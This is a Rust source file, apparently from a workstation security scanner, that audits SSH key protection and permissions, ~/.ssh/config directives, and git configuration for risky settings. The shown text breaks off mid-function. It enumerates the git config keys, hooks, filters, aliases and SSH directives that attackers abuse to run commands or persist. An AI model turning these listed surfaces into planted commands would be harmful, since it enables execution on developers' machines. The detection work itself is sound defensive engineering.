//! Source control: SSH key material, SSH client configuration, and the git
//! configuration surfaces an attacker uses for execution and persistence.

use super::{
    ControlAssessment, ControlContext, ControlStatus, Evidence, assessment, evidence, file_mode,
    git_output, home, no_home, project_roots, read_text, rule_control,
};
use std::path::{Path, PathBuf};

// ---------------------------------------------------------------------------
// SSH keys
// ---------------------------------------------------------------------------

/// What protects a private key at rest, read from the armor alone. The parse
/// never touches key material: the OpenSSH format states its cipher in
/// cleartext before any secret bytes, legacy PEM marks encryption with a
/// `Proc-Type` header, and PKCS#8 says it in the BEGIN line itself.
enum KeyProtection {
    Encrypted(String),
    Plaintext(String),
}

pub(super) fn ssh_passphrase(ctx: &ControlContext<'_>) -> ControlAssessment {
    const ID: &str = "ssh-key-passphrase";
    let Some(home_dir) = home(ctx) else {
        return no_home(ID);
    };
    let ssh = home_dir.join(".ssh");
    if !ssh.is_dir() {
        return assessment(
            ID,
            ControlStatus::NotApplicable,
            vec![evidence("No ~/.ssh directory was found", Some(ssh))],
            Vec::new(),
        );
    }
    let (keys, unparsed) = ssh_key_inventory(&ssh);
    if keys.is_empty() && unparsed.is_empty() {
        return assessment(
            ID,
            ControlStatus::NotApplicable,
            vec![evidence("No private keys were found in ~/.ssh", Some(ssh))],
            Vec::new(),
        );
    }
    let mut rows: Vec<Evidence> = Vec::new();
    let mut plaintext = 0usize;
    for (path, protection) in keys {
        match protection {
            KeyProtection::Encrypted(how) => {
                rows.push(evidence(format!("Key is encrypted ({how})"), Some(path)));
            }
            KeyProtection::Plaintext(how) => {
                plaintext += 1;
                rows.push(evidence(
                    format!("Key has no passphrase ({how})"),
                    Some(path),
                ));
            }
        }
    }
    for path in unparsed {
        rows.push(evidence(
            "File is named like a private key but could not be parsed",
            Some(path),
        ));
    }
    let status = if plaintext > 0 {
        ControlStatus::Failed
    } else if rows
        .iter()
        .any(|row| row.summary.starts_with("File is named"))
    {
        ControlStatus::Unknown
    } else {
        ControlStatus::Passed
    };
    assessment(ID, status, rows, Vec::new())
}

/// Private keys in `~/.ssh`: every non-`.pub` file whose contents parse as an
/// armored private key, plus `id_*` files that do not parse (they still name a
/// key husk could not classify, e.g. a PuTTY `.ppk` or an unreadable file).
fn ssh_key_inventory(ssh: &Path) -> (Vec<(PathBuf, KeyProtection)>, Vec<PathBuf>) {
    let mut keys = Vec::new();
    let mut unparsed = Vec::new();
    let Ok(entries) = std::fs::read_dir(ssh) else {
        return (keys, unparsed);
    };
    let mut paths: Vec<PathBuf> = entries
        .filter_map(Result::ok)
        .map(|entry| entry.path())
        .filter(|path| path.is_file())
        .filter(|path| path.extension().is_none_or(|ext| ext != "pub"))
        .collect();
    paths.sort();
    for path in paths {
        match read_text(&path).as_deref().and_then(key_protection) {
            Some(protection) => keys.push((path, protection)),
            None => {
                let named_like_key = path
                    .file_name()
                    .and_then(|name| name.to_str())
                    .is_some_and(|name| name.starts_with("id_"));
                if named_like_key {
                    unparsed.push(path);
                }
            }
        }
    }
    (keys, unparsed)
}

fn key_protection(contents: &str) -> Option<KeyProtection> {
    let first = contents
        .lines()
        .find(|line| !line.trim().is_empty())?
        .trim();
    if first == "-----BEGIN OPENSSH PRIVATE KEY-----" {
        let cipher = openssh_cipher(contents)?;
        return Some(if cipher == "none" {
            KeyProtection::Plaintext("OpenSSH format, cipher none".to_string())
        } else {
            KeyProtection::Encrypted(format!("OpenSSH format, {cipher}"))
        });
    }
    if first == "-----BEGIN ENCRYPTED PRIVATE KEY-----" {
        return Some(KeyProtection::Encrypted("PKCS#8".to_string()));
    }
    if first == "-----BEGIN PRIVATE KEY-----" {
        return Some(KeyProtection::Plaintext("PKCS#8, unencrypted".to_string()));
    }
    if matches!(
        first,
        "-----BEGIN RSA PRIVATE KEY-----"
            | "-----BEGIN DSA PRIVATE KEY-----"
            | "-----BEGIN EC PRIVATE KEY-----"
    ) {
        return Some(if contents.contains("Proc-Type: 4,ENCRYPTED") {
            KeyProtection::Encrypted("legacy PEM with Proc-Type 4,ENCRYPTED".to_string())
        } else {
            KeyProtection::Plaintext("legacy PEM, no encryption header".to_string())
        });
    }
    None
}

/// The cipher name from an OpenSSH-format private key. Per PROTOCOL.key the
/// decoded blob is the magic `openssh-key-v1\0` followed by a length-prefixed
/// `ciphername` string; `none` means the key is stored unencrypted. Everything
/// after the cipher name is never read.
fn openssh_cipher(armor: &str) -> Option<String> {
    let body: String = armor
        .lines()
        .skip(1)
        .take_while(|line| !line.starts_with("-----END"))
        .collect();
    let bytes = base64_decode(&body)?;
    let rest = bytes.strip_prefix(b"openssh-key-v1\0".as_slice())?;
    let len = u32::from_be_bytes(rest.get(..4)?.try_into().ok()?) as usize;
    if len == 0 || len > 64 {
        return None;
    }
    String::from_utf8(rest.get(4..4 + len)?.to_vec()).ok()
}

fn base64_decode(input: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(input.len() / 4 * 3);
    let mut acc: u32 = 0;
    let mut bits = 0u32;
    for byte in input.bytes() {
        if byte.is_ascii_whitespace() {
            continue;
        }
        if byte == b'=' {
            break;
        }
        let value = match byte {
            b'A'..=b'Z' => byte - b'A',
            b'a'..=b'z' => byte - b'a' + 26,
            b'0'..=b'9' => byte - b'0' + 52,
            b'+' => 62,
            b'/' => 63,
            _ => return None,
        };
        acc = (acc << 6) | u32::from(value);
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
        }
    }
    Some(out)
}

// ---------------------------------------------------------------------------
// SSH client configuration
// ---------------------------------------------------------------------------

pub(super) fn ssh_config(ctx: &ControlContext<'_>) -> ControlAssessment {
    const ID: &str = "ssh-config-hardening";
    let Some(home_dir) = home(ctx) else {
        return no_home(ID);
    };
    let path = home_dir.join(".ssh/config");
    let Some(contents) = read_text(&path) else {
        return assessment(
            ID,
            ControlStatus::NotApplicable,
            vec![evidence("No ~/.ssh/config was found", Some(path))],
            Vec::new(),
        );
    };
    let problems = ssh_config_problems(&contents);
    if problems.is_empty() {
        return assessment(
            ID,
            ControlStatus::Passed,
            vec![evidence(
                "No unsafe directives in ~/.ssh/config",
                Some(path),
            )],
            Vec::new(),
        );
    }
    assessment(
        ID,
        ControlStatus::Failed,
        problems
            .into_iter()
            .map(|summary| evidence(summary, Some(path.clone())))
            .collect(),
        Vec::new(),
    )
}

fn ssh_config_problems(contents: &str) -> Vec<String> {
    let mut problems = Vec::new();
    let mut block = "the global section".to_string();
    let mut permit_local_command = false;
    let mut local_command = false;
    for line in contents.lines() {
        let Some((key, value)) = ssh_directive(line) else {
            continue;
        };
        let value_lc = value.trim_matches('"').to_ascii_lowercase();
        match key.as_str() {
            "host" | "match" => {
                flush_local_command(&mut problems, &block, permit_local_command, local_command);
                let keyword = if key == "host" { "Host" } else { "Match" };
                block = format!("block \"{keyword} {value}\"");
                permit_local_command = false;
                local_command = false;
            }
            "stricthostkeychecking" if value_lc == "no" || value_lc == "off" => {
                problems.push(format!(
                    "StrictHostKeyChecking {value_lc} in {block}: changed and unknown host keys are accepted silently; use accept-new"
                ));
            }
            "userknownhostsfile"
                if value_lc
                    .split_whitespace()
                    .any(|file| file == "/dev/null" || file == "none") =>
            {
                problems.push(format!(
                    "UserKnownHostsFile {value_lc} in {block}: host keys are never remembered, so every connection trusts an unverified server"
                ));
            }
            "checkhostip" if value_lc == "no" => {
                problems.push(format!(
                    "CheckHostIP no in {block}: a known host key served from a new address is not cross-checked"
                ));
            }
            "forwardagent" if value_lc == "yes" => {
                problems.push(format!(
                    "ForwardAgent yes in {block}: anyone who can reach the agent socket on the remote host can sign with your local keys; use ProxyJump for hops"
                ));
            }
            "forwardx11trusted" if value_lc == "yes" => {
                problems.push(format!(
                    "ForwardX11Trusted yes in {block}: the remote side gets full access to your display, including input snooping"
                ));
            }
            "permitlocalcommand" if value_lc == "yes" => permit_local_command = true,
            "localcommand" => local_command = true,
            _ => {}
        }
    }
    flush_local_command(&mut problems, &block, permit_local_command, local_command);
    problems
}

fn flush_local_command(problems: &mut Vec<String>, block: &str, permit: bool, command: bool) {
    if permit && command {
        problems.push(format!(
            "PermitLocalCommand with LocalCommand in {block}: the config itself runs a local command on connect"
        ));
    }
}

/// One `Key value` line of ssh_config; ssh also accepts `Key=value`. The key
/// comes back lowercased because ssh keywords are case-insensitive.
fn ssh_directive(line: &str) -> Option<(String, &str)> {
    let line = line.trim();
    if line.is_empty() || line.starts_with('#') {
        return None;
    }
    let split = line.find(|ch: char| ch.is_whitespace() || ch == '=')?;
    let (key, rest) = line.split_at(split);
    let value = rest
        .trim_start_matches(|ch: char| ch.is_whitespace() || ch == '=')
        .trim();
    (!value.is_empty()).then(|| (key.to_ascii_lowercase(), value))
}

// ---------------------------------------------------------------------------
// SSH file permissions
// ---------------------------------------------------------------------------

pub(super) fn ssh_permissions(ctx: &ControlContext<'_>) -> ControlAssessment {
    const ID: &str = "ssh-file-permissions";
    let Some(home_dir) = home(ctx) else {
        return no_home(ID);
    };
    let ssh = home_dir.join(".ssh");
    if !ssh.is_dir() {
        return assessment(
            ID,
            ControlStatus::NotApplicable,
            vec![evidence("No ~/.ssh directory was found", Some(ssh))],
            Vec::new(),
        );
    }
    let Some(dir_mode) = file_mode(&ssh) else {
        return assessment(
            ID,
            ControlStatus::Unknown,
            vec![evidence(
                "File modes are not readable on this platform",
                Some(ssh),
            )],
            Vec::new(),
        );
    };
    let mut problems: Vec<Evidence> = Vec::new();
    if dir_mode & 0o077 != 0 {
        problems.push(evidence(
            format!("~/.ssh is mode {dir_mode:03o}, expected 700"),
            Some(ssh.clone()),
        ));
    }
    let (keys, _) = ssh_key_inventory(&ssh);
    for (path, _) in keys {
        if let Some(mode) = file_mode(&path)
            && mode & 0o077 != 0
        {
            problems.push(evidence(
                format!("Private key is mode {mode:03o}, expected 600"),
                Some(path),
            ));
        }
    }
    let config = ssh.join("config");
    if let Some(mode) = file_mode(&config)
        && mode & 0o022 != 0
    {
        problems.push(evidence(
            format!("~/.ssh/config is mode {mode:03o}, writable by group or world"),
            Some(config),
        ));
    }
    if problems.is_empty() {
        return assessment(
            ID,
            ControlStatus::Passed,
            vec![evidence(
                "~/.ssh, private keys, and config carry owner-only permissions",
                Some(ssh),
            )],
            Vec::new(),
        );
    }
    assessment(ID, ControlStatus::Failed, problems, Vec::new())
}

// ---------------------------------------------------------------------------
// Hardware-backed SSH key
// ---------------------------------------------------------------------------

enum PublicKeyClass {
    HardwareTouch,
    HardwareTouchless,
    Sound,
    Weak,
}

pub(super) fn hardware_key(ctx: &ControlContext<'_>) -> ControlAssessment {
    const ID: &str = "hardware-backed-ssh-key";
    let Some(home_dir) = home(ctx) else {
        return no_home(ID);
    };
    let ssh = home_dir.join(".ssh");
    if !ssh.is_dir() {
        return assessment(
            ID,
            ControlStatus::NotApplicable,
            vec![evidence("No ~/.ssh directory was found", Some(ssh))],
            Vec::new(),
        );
    }
    let Ok(entries) = std::fs::read_dir(&ssh) else {
        return assessment(
            ID,
            ControlStatus::Unknown,
            vec![evidence("~/.ssh could not be read", Some(ssh))],
            Vec::new(),
        );
    };
    let mut pubs: Vec<PathBuf> = entries
        .filter_map(Result::ok)
        .map(|entry| entry.path())
        .filter(|path| path.is_file() && path.extension().is_some_and(|ext| ext == "pub"))
        .collect();
    pubs.sort();

    let mut rows: Vec<Evidence> = Vec::new();
    let (mut touch, mut touchless, mut sound, mut weak) = (0usize, 0usize, 0usize, 0usize);
    for path in pubs {
        let Some(line) = read_text(&path)
            .and_then(|c| c.lines().find(|l| !l.trim().is_empty()).map(str::to_string))
        else {
            continue;
        };
        let Some((class, key_type)) = classify_public_key(&line) else {
            continue;
        };
        match class {
            PublicKeyClass::HardwareTouch => {
                touch += 1;
                rows.push(evidence(
                    format!("Hardware-backed key requiring touch ({key_type})"),
                    Some(path),
                ));
            }
            PublicKeyClass::HardwareTouchless => {
                touchless += 1;
                rows.push(evidence(
                    format!(
                        "Hardware-backed key ({key_type}) with no-touch-required, which removes the presence check"
                    ),
                    Some(path),
                ));
            }
            PublicKeyClass::Sound => {
                sound += 1;
                rows.push(evidence(format!("Software key ({key_type})"), Some(path)));
            }
            PublicKeyClass::Weak => {
                weak += 1;
                rows.push(evidence(
                    format!("Weak-algorithm key ({key_type}); replace with ed25519 or ed25519-sk"),
                    Some(path),
                ));
            }
        }
    }
    if rows.is_empty() {
        return assessment(
            ID,
            ControlStatus::NotApplicable,
            vec![evidence("No public keys were found in ~/.ssh", Some(ssh))],
            Vec::new(),
        );
    }
    // A touch-required FIDO2 key with no weak or touchless key alongside it is
    // the target state; any hardware or ed25519 presence is partial credit; a
    // key ring that is nothing but weak algorithms fails.
    let status = if touch > 0 && touchless == 0 && weak == 0 {
        ControlStatus::Passed
    } else if touch + touchless + sound > 0 {
        ControlStatus::Partial
    } else {
        ControlStatus::Failed
    };
    assessment(ID, status, rows, Vec::new())
}

fn classify_public_key(line: &str) -> Option<(PublicKeyClass, String)> {
    let tokens: Vec<&str> = line.split_whitespace().collect();
    let type_index = tokens.iter().position(|token| {
        token.starts_with("ssh-") || token.starts_with("ecdsa-") || token.starts_with("sk-")
    })?;
    let key_type = tokens[type_index];
    // authorized_keys-style options may precede the type on the same line.
    let no_touch = tokens[..type_index]
        .iter()
        .any(|token| token.split(',').any(|option| option == "no-touch-required"));
    let class = match key_type {
        "sk-ssh-ed25519@openssh.com" | "sk-ecdsa-sha2-nistp256@openssh.com" => {
            if no_touch {
                PublicKeyClass::HardwareTouchless
            } else {
                PublicKeyClass::HardwareTouch
            }
        }
        "ssh-dss" | "ssh-rsa" => PublicKeyClass::Weak,
        t if t.starts_with("ecdsa-sha2-") => PublicKeyClass::Weak,
        _ => PublicKeyClass::Sound,
    };
    Some((class, key_type.to_string()))
}

// ---------------------------------------------------------------------------
// Git hooks
// ---------------------------------------------------------------------------

pub(super) fn git_hooks(ctx: &ControlContext<'_>) -> ControlAssessment {
    let applicable = project_roots(ctx)
        .iter()
        .any(|root| root.join(".git").exists());
    rule_control("git-hooks", ctx.report, &["git-hook"], applicable)
}

// ---------------------------------------------------------------------------
// Git config plumbing
// ---------------------------------------------------------------------------

/// Ordered `section.key` / value pairs from one git config file.
///
/// Parsed in process rather than by `git config --list`: these probes run once
/// per repository plus three times over the global config, and a subprocess per
/// read dominated the scan's fixed cost. Keys are emitted the way `--list`
/// emits them, section and key lowercased with the subsection's case kept, so
/// callers match on `core.hookspath`.
///
/// Includes are deliberately not followed. `include.path` pointing somewhere
/// hostile is itself one of the things [`config_execution`] looks for, so it
/// has to stay visible as a raw entry.
fn git_config_file(path: &Path) -> Option<Vec<(String, String)>> {
    let contents = read_text(path)?;
    let mut section = String::new();
    let mut entries = Vec::new();
    for line in contents.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
            continue;
        }
        if let Some(header) = line.strip_prefix('[').and_then(|l| l.strip_suffix(']')) {
            section = match header.split_once('"') {
                // `[remote "origin"]`: the subsection keeps its case.
                Some((name, rest)) => format!(
                    "{}.{}",
                    name.trim().to_ascii_lowercase(),
                    rest.trim_end_matches('"')
                ),
                None => header.trim().to_ascii_lowercase(),
            };
            continue;
        }
        // A key with no `=` is git's shorthand for a true boolean.
        let (key, value) = line
            .split_once('=')
            .map_or((line, "true"), |(key, value)| (key.trim(), value.trim()));
        entries.push((
            format!("{section}.{}", key.to_ascii_lowercase()),
            value.trim_matches('"').to_string(),
        ));
    }
    Some(entries)
}

/// The scanned user's global git config: `~/.config/git/config` then
/// `~/.gitconfig`, concatenated in git's read order so a last-wins lookup
/// returns git's effective value. Read by path from the report's home rather
/// than `git config --global`, so tests can point it at a fixture home.
fn global_git_config(home_dir: &Path) -> Vec<(String, String)> {
    let mut entries = Vec::new();
    for path in [
        home_dir.join(".config/git/config"),
        home_dir.join(".gitconfig"),
    ] {
        if path.is_file() {
            entries.extend(git_config_file(&path).unwrap_or_default());
        }
    }
    entries
}

fn config_value<'a>(entries: &'a [(String, String)], key: &str) -> Option<&'a str> {
    entries
        .iter()
        .rev()
        .find(|(name, _)| name == key)
        .map(|(_, value)| value.as_str())
}

fn config_bool(entries: &[(String, String)], key: &str) -> bool {
    config_value(entries, key).is_some_and(|value| {
        matches!(
            value.to_ascii_lowercase().as_str(),
            "true" | "yes" | "on" | "1"
        )
    })
}

/// The config file of the repository at `root`. `.git` may be a directory or,
/// for linked worktrees and submodules, a `gitdir:` pointer file.
fn repo_config_path(root: &Path) -> Option<PathBuf> {
    let dotgit = root.join(".git");
    let git_dir = if dotgit.is_dir() {
        dotgit
    } else {
        let pointer = read_text(&dotgit)?;
        let target = pointer
            .lines()
            .find_map(|line| line.strip_prefix("gitdir:"))?
            .trim();
        let target = PathBuf::from(target);
        if target.is_absolute() {
            target
        } else {
            root.join(target)
        }
    };
    let config = git_dir.join("config");
    config.is_file().then_some(config)
}

// ---------------------------------------------------------------------------
// Global template / hooks-path hijack
// ---------------------------------------------------------------------------

pub(super) fn template_hijack(ctx: &ControlContext<'_>) -> ControlAssessment {
    const ID: &str = "git-template-hijack";
    let Some(home_dir) = home(ctx) else {
        return no_home(ID);
    };
    let entries = global_git_config(home_dir);
    let mut targets: Vec<(&str, String, Option<PathBuf>)> = Vec::new();
    if let Some(value) = config_value(&entries, "init.templatedir") {
        targets.push((
            "init.templateDir",
            value.to_string(),
            resolve_config_path(home_dir, value).map(|dir| dir.join("hooks")),
        ));
    }
    if let Some(value) = config_value(&entries, "core.hookspath") {
        targets.push((
            "core.hooksPath",
            value.to_string(),
            resolve_config_path(home_dir, value),
        ));
    }
    if targets.is_empty() {
        return assessment(
            ID,
            ControlStatus::Passed,
            vec![evidence(
                "Neither init.templateDir nor core.hooksPath is set in the global git config",
                None,
            )],
            Vec::new(),
        );
    }
    let mut rows: Vec<Evidence> = Vec::new();
    let mut executable = 0usize;
    for (key, value, hooks_dir) in targets {
        let hooks = hooks_dir
            .as_deref()
            .map(executable_hooks)
            .unwrap_or_default();
        if hooks.is_empty() {
            rows.push(evidence(
                format!("{key} is set to {value}, currently without executable hooks"),
                hooks_dir,
            ));
        } else {
            executable += hooks.len();
            rows.push(evidence(
                format!(
                    "{key} is set to {value} and carries executable hooks: {}",
                    hooks.join(", ")
                ),
                hooks_dir,
            ));
        }
    }
    let status = if executable > 0 {
        ControlStatus::Failed
    } else {
        ControlStatus::Partial
    };
    assessment(ID, status, rows, Vec::new())
}

/// A path value from git config, resolved against the scanned home. A relative
/// value cannot be resolved reliably from outside git; the key is still
/// reported as set, just without a hooks listing.
fn resolve_config_path(home_dir: &Path, value: &str) -> Option<PathBuf> {
    if let Some(rest) = value.strip_prefix("~/") {
        return Some(home_dir.join(rest));
    }
    let path = PathBuf::from(value);
    path.is_absolute().then_some(path)
}

/// Names of executable, non-sample files directly in `dir`. Where the platform
/// has no execute bit, every non-sample file counts: git on Windows runs hooks
/// regardless.
fn executable_hooks(dir: &Path) -> Vec<String> {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return Vec::new();
    };
    let mut names: Vec<String> = entries
        .filter_map(Result::ok)
        .map(|entry| entry.path())
        .filter(|path| path.is_file())
        .filter(|path| path.extension().is_none_or(|ext| ext != "sample"))
        .filter(|path| file_mode(path).is_none_or(|mode| mode & 0o111 != 0))
        .filter_map(|path| {
            path.file_name()
                .map(|name| name.to_string_lossy().into_owned())
        })
        .collect();
    names.sort();
    names
}

// ---------------------------------------------------------------------------
// Repo-local command-executing config
// ---------------------------------------------------------------------------

/// Keys git honours from a repo-local config that run a command during
/// ordinary use (`git status`, `git log`, `git diff`). Git's protected
/// configuration, the keys it refuses to read from this file, is exactly
/// three: `safe.bareRepository`, `safe.directory`, `uploadpack.packObjectsHook`.
const REPO_EXEC_KEYS: &[&str] = &[
    "core.hookspath",
    "core.fsmonitor",
    "core.pager",
    "core.editor",
    "sequence.editor",
    "core.sshcommand",
    "core.gitproxy",
    "diff.external",
];

pub(super) fn config_execution(ctx: &ControlContext<'_>) -> ControlAssessment {
    const ID: &str = "git-config-execution";
    let mut inspected = 0usize;
    let mut rows: Vec<Evidence> = Vec::new();
    for root in project_roots(ctx) {
        let Some(config) = repo_config_path(&root) else {
            continue;
        };
        let Some(entries) = git_config_file(&config) else {
            continue;
        };
        inspected += 1;
        for problem in repo_config_problems(&entries, &config, home(ctx)) {
            rows.push(evidence(problem, Some(config.clone())));
        }
    }
    if inspected == 0 {
        return assessment(
            ID,
            ControlStatus::NotApplicable,
            vec![evidence(
                "No git repository configs were found at the scanned roots",
                None,
            )],
            Vec::new(),
        );
    }
    if rows.is_empty() {
        return assessment(
            ID,
            ControlStatus::Passed,
            vec![evidence(
                format!("{inspected} repository config file(s) hold no command-executing keys"),
                None,
            )],
            Vec::new(),
        );
    }
    assessment(ID, ControlStatus::Failed, rows, Vec::new())
}

fn repo_config_problems(
    entries: &[(String, String)],
    config: &Path,
    home_dir: Option<&Path>,
) -> Vec<String> {
    let mut problems = Vec::new();
    let mut show_signature = false;
    let mut gpg_program: Option<String> = None;
    for (key, value) in entries {
        let display = display_value(value);
        if REPO_EXEC_KEYS.contains(&key.as_str()) {
            // A plain bool `core.fsmonitor` toggles the builtin daemon rather
            // than naming a command; only the command form is flagged.
            if key == "core.fsmonitor" && matches!(value.as_str(), "true" | "false") {
                continue;
            }
            problems.push(format!(
                "{key} = {display} runs a command from the repo-local config"
            ));
        } else if key == "log.showsignature" && value == "true" {
            show_signature = true;
        } else if key == "gpg.program" {
            gpg_program = Some(display);
        } else if key.starts_with("credential.") && key.ends_with(".helper") {
            if value.starts_with('!') {
                problems.push(format!(
                    "{key} = {display} is a shell command run on credential lookup"
                ));
            }
        } else if key.starts_with("alias.") && value.starts_with('!') {
            problems.push(format!(
                "{key} = {display} is a shell alias defined by the repository"
            ));
        } else if key.starts_with("filter.")
            && (key.ends_with(".clean") || key.ends_with(".smudge"))
        {
            problems.push(format!("{key} = {display} runs on checkout and commit"));
        } else if (key == "include.path"
            || (key.starts_with("includeif.") && key.ends_with(".path")))
            && let Some(problem) = risky_include(config, key, value, home_dir)
        {
            problems.push(problem);
        }
    }
    if show_signature && let Some(program) = gpg_program {
        problems.push(format!(
            "log.showSignature with gpg.program = {program} runs that binary on every git log"
        ));
    }
    problems
}

/// An include from a repo-local config is a second config file with the same
/// powers; flag it when the included file is writable by others or owned by a
/// different user than the config itself.
fn risky_include(config: &Path, key: &str, value: &str, home_dir: Option<&Path>) -> Option<String> {
    let base = config.parent()?;
    let target = if let Some(rest) = value.strip_prefix("~/") {
        home_dir?.join(rest)
    } else {
        let path = PathBuf::from(value);
        if path.is_absolute() {
            path
        } else {
            base.join(path)
        }
    };
    #[cfg(unix)]
    {
        use std::os::unix::fs::MetadataExt;
        let meta = std::fs::metadata(&target).ok()?;
        let config_owner = std::fs::metadata(config).ok()?.uid();
        if meta.mode() & 0o002 != 0 {
            return Some(format!(
                "{key} includes a world-writable config file ({})",
                target.display()
            ));
        }
        if meta.uid() != config_owner {
            return Some(format!(
                "{key} includes a config file owned by another user ({})",
                target.display()
            ));
        }
        None
    }
    #[cfg(not(unix))]
    {
        let _ = (key, target);
        None
    }
}

fn display_value(value: &str) -> String {
    const MAX: usize = 80;
    if value.chars().count() <= MAX {
        value.to_string()
    } else {
        let head: String = value.chars().take(MAX).collect();
        format!("{head}...")
    }
}

// ---------------------------------------------------------------------------
// Object-integrity configuration
// ---------------------------------------------------------------------------

pub(super) fn integrity_config(ctx: &ControlContext<'_>) -> ControlAssessment {
    const ID: &str = "git-integrity-config";
    let Some(home_dir) = home(ctx) else {
        return no_home(ID);
    };
    let entries = global_git_config(home_dir);
    let mut problems: Vec<Evidence> = Vec::new();
    let fsck_on = config_bool(&entries, "transfer.fsckobjects")
        || (config_bool(&entries, "fetch.fsckobjects")
            && config_bool(&entries, "receive.fsckobjects"));
    if !fsck_on {
        problems.push(evidence(
            "transfer.fsckObjects is off, so fetched objects are stored without integrity checks",
            None,
        ));
    }
    if entries
        .iter()
        .any(|(key, value)| key == "safe.directory" && value == "*")
    {
        problems.push(evidence(
            "safe.directory = * trusts repositories owned by any user (re-opens CVE-2022-24765)",
            None,
        ));
    }
    if config_value(&entries, "protocol.file.allow")
        .is_some_and(|value| value.eq_ignore_ascii_case("always"))
    {
        problems.push(evidence(
            "protocol.file.allow = always lets any submodule clone from a local path (re-opens CVE-2022-39253)",
            None,
        ));
    }
    if config_value(&entries, "http.sslverify")
        .is_some_and(|value| value.eq_ignore_ascii_case("false"))
    {
        problems.push(evidence("http.sslVerify is disabled globally", None));
    }
    for root in project_roots(ctx) {
        let Some(config) = repo_config_path(&root) else {
            continue;
        };
        let Some(repo_entries) = git_config_file(&config) else {
            continue;
        };
        for (key, value) in &repo_entries {
            if !(key.starts_with("remote.") && key.ends_with(".url")) {
                continue;
            }
            if value.starts_with("http://") || value.starts_with("git://") {
                problems.push(evidence(
                    format!("{key} uses an unencrypted transport: {}", redact_url(value)),
                    Some(config.clone()),
                ));
            } else if url_embeds_credential(value) {
                problems.push(evidence(
                    format!(
                        "{key} embeds a credential in the URL ({})",
                        redact_url(value)
                    ),
                    Some(config.clone()),
                ));
            }
        }
    }
    if problems.is_empty() {
        return assessment(
            ID,
            ControlStatus::Passed,
            vec![evidence(
                "Object integrity checking is on, with no unsafe overrides or remote URLs",
                None,
            )],
            Vec::new(),
        );
    }
    assessment(ID, ControlStatus::Failed, problems, Vec::new())
}

/// `https://user:secret@host/...`: userinfo containing a colon is a credential
/// sitting in cleartext in `.git/config`, outside any credential helper.
fn url_embeds_credential(url: &str) -> bool {
    let rest = url.split_once("://").map_or(url, |(_, rest)| rest);
    let authority = rest.split(['/', '?']).next().unwrap_or(rest);
    authority
        .rsplit_once('@')
        .is_some_and(|(userinfo, _)| userinfo.contains(':'))
}

/// A URL safe to print: userinfo is replaced, never echoed.
fn redact_url(url: &str) -> String {
    let Some((scheme, rest)) = url.split_once("://") else {
        return url.to_string();
    };
    match rest.split_once('@') {
        Some((_, tail)) => format!("{scheme}://[redacted]@{tail}"),
        None => url.to_string(),
    }
}

// ---------------------------------------------------------------------------
// Commit signing
// ---------------------------------------------------------------------------

pub(super) fn signed_commits(ctx: &ControlContext<'_>) -> ControlAssessment {
    const ID: &str = "signed-commits";
    let Some(home_dir) = home(ctx) else {
        return no_home(ID);
    };
    let entries = global_git_config(home_dir);
    if !config_bool(&entries, "commit.gpgsign") {
        return assessment(
            ID,
            ControlStatus::Failed,
            vec![evidence(
                "commit.gpgsign is not enabled in the global git config",
                None,
            )],
            Vec::new(),
        );
    }
    let format = config_value(&entries, "gpg.format").unwrap_or("openpgp");
    let mut rows = vec![evidence(
        format!("commit.gpgsign is on (gpg.format {format})"),
        None,
    )];
    let mut gaps = 0usize;
    if config_value(&entries, "user.signingkey").is_none() {
        gaps += 1;
        rows.push(evidence(
            "user.signingkey is unset, so git guesses which key to sign with",
            None,
        ));
    }
    if format == "ssh" && config_value(&entries, "gpg.ssh.allowedsignersfile").is_none() {
        gaps += 1;
        rows.push(evidence(
            "gpg.format is ssh with no gpg.ssh.allowedSignersFile, so signatures cannot be verified locally",
            None,
        ));
    }
    if let Some(program) = config_value(&entries, "gpg.program") {
        let standard = Path::new(program)
            .file_name()
            .is_some_and(|name| name == "gpg" || name == "gpg2");
        if !standard {
            gaps += 1;
            rows.push(evidence(
                format!("gpg.program points at a non-standard binary ({program})"),
                None,
            ));
        }
    }
    rows.push(evidence(
        if config_bool(&entries, "tag.gpgsign") {
            "tag.gpgsign is on"
        } else {
            "tag.gpgsign is off, so tags are unsigned"
        },
        None,
    ));
    let status = if gaps == 0 {
        ControlStatus::Passed
    } else {
        ControlStatus::Partial
    };
    assessment(ID, status, rows, Vec::new())
}

// ---------------------------------------------------------------------------
// Git client version
// ---------------------------------------------------------------------------

pub(super) fn client_version(_: &ControlContext<'_>) -> ControlAssessment {
    const ID: &str = "git-client-version";
    let Some(version) = git_output(&["--version"]) else {
        return assessment(
            ID,
            ControlStatus::NotApplicable,
            vec![evidence("git was not found on this machine", None)],
            Vec::new(),
        );
    };
    let Some((major, minor, patch)) = parse_git_version(&version) else {
        return assessment(
            ID,
            ControlStatus::Unknown,
            vec![evidence(
                format!("Could not parse a git version from \"{version}\""),
                None,
            )],
            Vec::new(),
        );
    };
    if clone_rce_fixed(major, minor, patch) {
        assessment(
            ID,
            ControlStatus::Passed,
            vec![evidence(
                format!("git {major}.{minor}.{patch} includes the CVE-2024-32002 clone fixes"),
                None,
            )],
            Vec::new(),
        )
    } else {
        assessment(
            ID,
            ControlStatus::Failed,
            vec![evidence(
                format!(
                    "git {major}.{minor}.{patch} predates the CVE-2024-32002 clone RCE fixes; upgrade to 2.45.1 or your minor line's backport"
                ),
                None,
            )],
            Vec::new(),
        )
    }
}

/// First `major.minor[.patch]` in the output; tolerates suffixes like
/// `2.47.1.windows.1` and `(Apple Git-146)`.
fn parse_git_version(output: &str) -> Option<(u32, u32, u32)> {
    let token = output
        .split_whitespace()
        .find(|token| token.starts_with(|ch: char| ch.is_ascii_digit()))?;
    let mut numbers = token.split('.').map(|part| {
        let digits: String = part.chars().take_while(char::is_ascii_digit).collect();
        digits.parse::<u32>().ok()
    });
    let major = numbers.next()??;
    let minor = numbers.next()??;
    let patch = numbers.next().flatten().unwrap_or(0);
    Some((major, minor, patch))
}

/// The 2024-05 clone-RCE fixes (CVE-2024-32002/32004/32465) landed in 2.45.1
/// with backports to six older minor lines.
fn clone_rce_fixed(major: u32, minor: u32, patch: u32) -> bool {
    const BACKPORTS: [(u32, u32); 7] = [
        (39, 4),
        (40, 2),
        (41, 1),
        (42, 2),
        (43, 4),
        (44, 1),
        (45, 1),
    ];
    if major != 2 {
        return major > 2;
    }
    if minor > 45 {
        return true;
    }
    BACKPORTS
        .iter()
